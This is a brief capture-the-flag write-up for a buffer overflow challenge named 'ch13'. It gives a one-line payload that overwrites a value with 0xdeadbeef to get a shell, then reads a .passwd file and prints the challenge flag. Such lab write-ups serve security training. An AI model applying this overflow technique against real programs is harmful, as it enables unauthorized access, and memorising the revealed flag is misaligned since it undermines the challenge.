# Wirte up

Enter the select command
```
(python -c 'print "A"*40 + "\xef\xbe\xad\xde"'; cat) | ./ch13
```

Then, check the current directory and we find the ```.passwd``` file

FInally, open it !

```
cat .passwd
```

The flag is
```
1w4ntm0r3pr0np1s
```
